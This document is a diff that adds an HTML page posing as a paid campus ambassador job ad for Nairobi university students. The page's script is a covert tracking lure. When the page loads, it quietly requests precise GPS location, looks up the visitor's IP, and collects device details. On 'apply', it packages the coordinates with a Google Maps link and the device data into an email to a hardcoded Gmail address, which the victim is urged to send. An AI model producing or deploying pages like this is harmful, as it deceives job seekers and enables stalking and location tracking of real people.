@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Job Opportunity: Paid Campus Ambassador</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+            color: #333;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .card {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            max-width: 600px;
+            width: 100%;
+            text-align: left;
+            line-height: 1.6;
+        }
+        .header {
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .header h1 {
+            font-size: 1.5rem;
+            margin: 0 0 0.5rem 0;
+            color: #2c3e50;
+        }
+        .header p {
+            margin: 0;
+            color: #666;
+            font-size: 0.95rem;
+        }
+        .job-details {
+            background-color: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+        }
+        .job-details h2 {
+            font-size: 1.1rem;
+            margin-top: 0;
+            color: #333;
+        }
+        .job-details ul {
+            padding-left: 1.2rem;
+            margin-bottom: 0;
+        }
+        .job-details li {
+            margin-bottom: 0.5rem;
+        }
+        .highlight {
+            background-color: #e7f3ff;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 5px solid #007bff;
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+        }
+        .footer {
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid #eee;
+            font-size: 0.85rem;
+            color: #777;
+            text-align: center;
+        }
+        button {
+            margin-top: 1.5rem;
+            padding: 12px 24px;
+            background-color: #28a745; /* Green for "Apply" */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 1rem;
+            padding: 1rem;
+            background-color: #e9ecef;
+            border-radius: 8px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            display: none;
+        }
+        .success { border-left: 5px solid #28a745; display: block; }
+        .error { border-left: 5px solid #dc3545; display: block; }
+        .info { border-left: 5px solid #17a2b8; display: block; }
+        
+        @media (max-width: 480px) {
+            .card { padding: 1.5rem; }
+            .header h1 { font-size: 1.3rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <h1>🎓 Paid Campus Ambassador Role</h1>
+        <p>For Students in Nairobi & University Students Only</p>
+    </div>
+
+    <div class="job-details">
+        <h2>Role Overview</h2>
+        <p>We are looking for <strong>5 Student Ambassadors</strong> to join our Nairobi team. This is a perfect paid opportunity for students to gain marketing experience and earn a monthly stipend.</p>
+        <ul>
+            <li><strong>Pay:</strong> KES 5,000 - KES 8,000 per month + free products.</li>
+            <li><strong>Location:</strong> Remote (Nairobi-based students preferred).</li>
+            <li><strong>Time:</strong> 10 hours/week (Flexible around classes).</li>
+            <li><strong>Requirement:</strong> No prior experience needed—just a strong presence on Instagram/TikTok.</li>
+        </ul>
+    </div>
+
+    <div class="highlight">
+        <strong>⚠️ Application Deadline:</strong> This Sunday. 
+        <br>Only students from UoN, Strathmore, KCA, and MKU will be prioritized for this round. 
+        <br>To be considered, you must complete the <strong>2-minute Student Profile Form</strong> below.
+    </div>
+
+    <button id="applyBtn">Complete Application & Verify Location</button>
+    
+    <div id="statusBox" class="status">
+        Initializing...
+    </div>
+
+    <div class="footer">
+        Powered by TalentHub Recruitment | © 2023
+    </div>
+</div>
+
+<script>
+    const TARGET_EMAIL = "moennelda02@gmail.com";
+    const statusBox = document.getElementById('statusBox');
+    const applyBtn = document.getElementById('applyBtn');
+    
+    let collectedData = {};
+
+    function updateStatus(message, type) {
+        statusBox.style.display = 'block';
+        statusBox.className = `status ${type}`;
+        statusBox.textContent = message;
+    }
+
+    async function fetchIpInfo() {
+        try {
+            const response = await fetch('https://ipwho.is/');
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                country: data.country,
+                city: data.city,
+                region: data.region,
+                timezone: data.timezone
+            };
+        } catch (error) {
+            return { ip: "Unknown", country: "Unknown", city: "Unknown", region: "Unknown", timezone: "Unknown" };
+        }
+    }
+
+    async function gatherData() {
+        // 1. Get Current Location
+        let locationData = null;
+        let errorData = null;
+
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    resolve,
+                    reject,
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+
+            locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: position.timestamp
+            };
+
+        } catch (err) {
+            errorData = err.message;
+        }
+
+        // 2. Get IP Info
+        const ipInfo = await fetchIpInfo();
+
+        // 3. Get Session History & Device Info
+        const sessionHistory = window.history.length;
+        const currentUrl = window.location.href;
+        
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: window.screen.colorDepth
+        };
+
+        // Store in global variable for later use
+        collectedData = {
+            location: locationData,
+            error: errorData,
+            ip: ipInfo,
+            session: sessionHistory,
+            url: currentUrl,
+            device: deviceInfo
+        };
+
+        return collectedData;
+    }
+
+    function generateEmailBody(data) {
+        const loc = data.location;
+        const err = data.error;
+        const ip = data.ip;
+        const hist = data.session;
+        const dev = data.device;
+        const url = data.url;
+
+        let body = `STUDENT APPLICATION VERIFICATION REPORT\n`;
+        body += `Role: Campus Ambassador (Nairobi)\n`;
+        body += `Generated: ${new Date().toISOString()}\n`;
+        body += `----------------------------------------\n`;
+        
+        if (loc) {
+            body += `CURRENT LOCATION VERIFICATION:\n`;
+            body += `Coordinates: ${loc.latitude}, ${loc.longitude}\n`;
+            body += `Accuracy: ${loc.accuracy} meters\n`;
+            body += `Google Maps Link: https://www.google.com/maps?q=${loc.latitude},${loc.longitude}\n\n`;
+        } else {
+            body += `LOCATION ERROR: ${err}\n\n`;
+        }
+
+        body += `NETWORK INFO (IP):\n`;
+        body += `IP Address: ${ip.ip}\n`;
+        body += `Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
+        body += `Timezone: ${ip.timezone}\n\n`;
+
+        body += `SESSION CONTEXT:\n`;
+        body += `Application URL: ${url}\n`;
+        body += `Session History Length: ${hist} pages\n\n`;
+        
+        body += `DEVICE INFO:\n`;
+        body += `User Agent: ${dev.userAgent}\n`;
+        body += `Platform: ${dev.platform}\n`;
+        body += `Language: ${dev.language}\n`;
+        body += `Screen: ${dev.screenResolution}\n`;
+        
+        return body;
+    }
+
+    // Auto-run data collection on page load
+    // This ensures we have the data ready even if the user doesn't click the button immediately
+    gatherData().then(data => {
+        console.log("Data collected automatically:", data);
+    });
+
+    applyBtn.addEventListener('click', async () => {
+        applyBtn.disabled = true;
+        applyBtn.textContent = "Verifying Application...";
+        updateStatus("Gathering final verification data...", "info");
+
+        // Re-fetch data to ensure it's as current as possible at the moment of clicking
+        const data = await gatherData();
+
+        const subject = `Application: Campus Ambassador Role - ${data.ip.city}, ${data.ip.country}`;
+        const text = generateEmailBody(data);
+
+        // Construct mailto link
+        const mailtoLink = `mailto:${TARGET_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(text)}`;
+        
+        // Open mail client
+        window.location.href = mailtoLink;
+        
+        updateStatus(`Application Verification Complete.
+
+Your mail client should open with your application details pre-filled. Please ensure you click "Send" to submit your application to the recruitment team.
+
+If the mail client did not open, you can copy your verification details below:
+
+${text}`, "success");
+    });
+
+</script>
+
+</body>
+</html>
